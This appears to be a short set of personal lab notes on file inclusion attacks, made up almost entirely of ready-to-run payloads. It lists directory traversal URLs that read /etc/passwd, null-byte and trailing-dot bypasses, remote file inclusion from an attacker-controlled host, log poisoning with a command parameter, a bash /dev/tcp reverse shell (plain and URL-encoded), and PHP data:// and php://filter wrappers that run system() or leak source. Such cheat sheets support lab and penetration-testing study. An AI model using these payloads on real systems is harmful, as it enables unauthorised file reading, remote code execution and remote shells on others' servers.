File Inclusion

![1de19becbf0b23f1b92cb5057bb4f105.png](../../../../_resources/1de19becbf0b23f1b92cb5057bb4f105.png)

# Directory Traversal
```
http://webapp.thm/get.php?file=../../../../etc/passwd
```

# Dir Traversal with null byte (`%00`)
```
http://10.10.155.224/lab3.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
```

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

# Current directory trick
```
../../../../etc/passwd/.
```

# curl with null byte
```
curl -X POST 10.10.155.224/challenges/chall3.php -d "file=../../../../etc/flag3%00" -v --output -

0x00
```

# Remote file inclusion
```
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt

10.10.155.224/playground.php?file=http://10.2.11.84/cmd.txt
```

```
#At first we need 
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here

#Reverse shells
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 #encoded version of above reverse-shell

#PHP wrapper
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>" 
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php 
```
